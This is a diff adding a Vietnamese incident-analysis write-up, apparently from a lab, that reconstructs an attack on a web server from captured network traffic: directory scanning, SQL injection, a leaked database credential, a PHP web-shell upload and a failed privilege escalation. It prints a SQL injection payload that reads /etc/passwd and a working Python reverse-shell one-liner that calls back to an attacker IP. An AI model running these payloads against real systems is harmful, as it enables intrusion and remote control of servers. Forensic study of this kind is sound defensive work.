@@ -48,4 +48,59 @@ Dấu hiệu như sau và cũng giải thích cho mọi người dễ hiểu hơ
 
 Nếu đã xác định được cổng port open, thì tiếp đến attacker sẽ thực hiện tấn công vào web server này, đây chính là điều chắc chắn vì dựa trên flow attack của attacker thì không phải dự đoán mà là nó sẽ chắc chắn xảy ra khi attacker detect được cổng port nào open thì họ sẽ thực hiện hoặc sử dụng tool để attack vào service đó. Điều gần như chắc chắn là attacker sẽ thực hiện scan resource của WEB server này và mình sẽ thực hiện anaylysts cũng như phát hiện thêm nhiều IOCs để take note lại.
 
+Khi tiếp tục thực hiện phân tích và dự đoàn hành vi thì phát hiện được attacker đã sử dụng `gobuster` để thực hiện scan tài nguyên của web server này và họ đã thực hiện khá nhiều request tới web server để được phản hồi.
+![image.png](./assets/2026-07-26-network-analysts/4.png)
+Như có thể quan sát thấy được họ đã scan được rất nhiều directory hay còn gọi là folder có của web server, khi thực hiện scan thì phát hiện được web server này có một folder cho phép người dùng hoặc user được phép login vào hệ thống
+
+![image.png](./assets/2026-07-26-network-analysts/5.png)
+
+![image.png](./assets/2026-07-26-network-analysts/6.png)
+
+Đó chính là `login.php` và những resource liên quan như `browse.php`, `complaint.php`, `editprofile.php`. Đó là những resource mà liên quan và quan trọng trong web server này vì nếu ở resource nào cho phép upload file từ user tới server thì sẽ có khả năng gây ra reverse. Bên cạnh đó họ còn sử dụng sqlmap để thực hiện `sql injection`, điều này nhằm thao túng server chứa data và thực hiện leak data nhạy cảm ra bên ngoài dưới đây chính là bằng chứng cho thấy họ thực hiện `sql injection`.
+
+![image.png](./assets/2026-07-26-network-analysts/7.png)
+![image.png](./assets/2026-07-26-network-analysts/8.png)
+![image.png](./assets/2026-07-26-network-analysts/9.png)
+
+Đó chính là những bằng chứng tố cáo họ đã thực hiện `SQL Injection` kèm theo đó dưới đây chính là payload của hình **số 9** mà
+
+```
+8454 AND 1=1
+UNION ALL SELECT
+    1,
+    NULL,
+    '<script>alert("XSS")</script>',
+    table_name
+FROM information_schema.tables
+WHERE "1=1
+-- ...
+EXEC xp_cmdshell('cat ../../../etc/passwd')
+#
+```
+Hơn nữa attacker đã thực hiện thành công nhưng chưa thế xác định được là injection thành công hay không mặc dù server đã trả về đúng những gì cần phải làm, ngoài ra chưa thể xác định được đã connect với database success hay chưa, dưới đây chính là bằng chứng cho thấy không thể connect tới được server database.
+![image.png](./assets/2026-07-26-network-analysts/10.png)
+
+Server đã tiết lộ cho attacker một thông tin quan trọng `root:bobthe@localhost`, đây có khả năng là fomart **user:password@domai**, chỉ là khả năng trong phỏng đoán thôi, nhưng đây cũng là một loại lỗ hổng **Information Disclosure** hay cụ thể hơn là rò rỉ cấu hình thông tin xác thực database.
+
+Chưa thế xác định được attacker đã sử dụng thông tin mà được leak ra đó như thế nào nhưng tiếp với flow phân tích tiếp theo, chúng ta có bằng chứng attacker đã thực hiện upload file lên từ folder upload.php và dưới đây chính là bằng chứng cho thấy việc họ đã thực hiện upload
+
+![image.png](./assets/2026-07-26-network-analysts/11.png)
+
+Attacker đã thực hiện upload một file có tên là `dbfuctions.php` để thực hiện reverse shell và để chứng minh điều này dưới đây chính là bằng chứng cho thấy đây là chính một file mà dùng để thực hiện hành động nguy hiểm đó.
+
+![image.png](./assets/2026-07-26-network-analysts/12.png)
+
+Sừ dụng paterment *cmd* để thực hiện hành động `Reverse Shell` đặc biệt hơn nữa là chỉ có duy nhất 3 packet thực hiện điều này nhưng trong đó có một packet chứa payloads mà họ đã thực hiện dưới đây chính là payload đó.
+
+```
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.251.96.4",4422));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+ở payload này nó sẽ tạo socket kết nối tới IP `10.251.96.4` với cổng port **4422** và thực hiệ mở **/bin/sh** với chế độ tương tác để attacker có thể connect được với server.
+
+![image.png](./assets/2026-07-26-network-analysts/13.png)
+
+Thấy được cổng port **4422** đã open từ attacker và connect thành công tới server, với gần 346 packet đã được truyền tải từ 2 bên và khả năng cao giao tiếp giữa hai IP này sẽ có nhiều nguy hiểm, tất cả ý trên chỉ là phỏng đoán nhưng thông thường thì điều này xảy ra là có khả năng, thực hiện kiểm tra attacker đã làm thực hiện được những hành động gì trên server thì tổng hợp như thế này, mặc dù reverse shell đã thành công từ bob-appserver (10.251.96.5) tới attacker (10.251.96.4) bằng cổng port **4422**, được thực thi dưới account có tên là `www-data` bên cạnh đó attacker cố gắng leo thang đặc quyền lên root nhưng bị thất bại
+
+![image.png](./assets/2026-07-26-network-analysts/14.png)
+
 
